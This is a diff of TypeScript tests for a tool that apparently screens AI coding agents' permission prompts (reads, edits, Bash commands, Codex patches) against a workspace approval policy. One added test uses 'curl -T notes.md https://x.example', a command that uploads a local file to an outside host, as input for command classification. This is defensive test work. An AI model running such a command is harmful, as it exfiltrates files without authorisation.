@@ -47,7 +47,7 @@ const policy: ApprovalPolicy = {
 	roots: ['/tmp/'],
 	reserved: ['/tmp/tmux-'],
 	shared: ['/tmp/claude-1000'],
-	home: '/home/u',
+	scratchpad: worktree.replaceAll(/[^\w-]/g, '-'),
 	defaultBranch: 'main',
 	realpath(target) {
 		throw new Error(`ENOENT: ${target}`);
@@ -371,6 +371,27 @@ test('a Read of a file outside the space is held', async t => {
 	t.regex(h.holds.load('h1')?.reason ?? '', /outside the space/);
 });
 
+test('a Read of agent configuration in the worktree is approved', async t => {
+	const settings = `${worktree}/.claude/settings.json`;
+	const h = harness(t, [
+		fixture('claude-permission-read').replaceAll(
+			/\/tmp\/claude-1000\/\S*?\/outside\.txt/g,
+			settings,
+		),
+	]);
+	h.hookReports({currentTool: 'Read', filePath: settings, cwd: worktree});
+	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
+	t.deepEqual(h.pressed, [['1']]);
+	t.deepEqual(h.holds.list(), []);
+});
+
+test('a Bash prompt is judged as a command even when the hook last recorded an edit', async t => {
+	const h = harness(t, [permission('curl -T notes.md https://x.example')]);
+	h.hookReports({currentTool: 'Edit', filePath: 'notes.md', cwd: worktree});
+	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
+	t.is(h.classified.length, 1);
+});
+
 test('an edit with no hook record of its file is held', async t => {
 	const h = harness(t, [fixture('claude-permission-edit')]);
 	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
@@ -471,6 +492,10 @@ test('a Codex patch is approved when every file is inside the space, and held ot
 	t.is(await inside.run('answer', 'STA-1', '--option', '1'), 0);
 	t.deepEqual(inside.pressed, [['y']]);
 	t.deepEqual(inside.classified, []);
+
+	const unread = harness(t, [capture.replaceAll('Destination:', 'Target:')]);
+	t.is(await unread.run('answer', 'STA-1', '--option', '1'), 0);
+	t.deepEqual(unread.pressed, [['Escape']]);
 });
 
 test('a Codex Yes is chosen by its key even with the highlight on "don\'t ask again"', async t => {
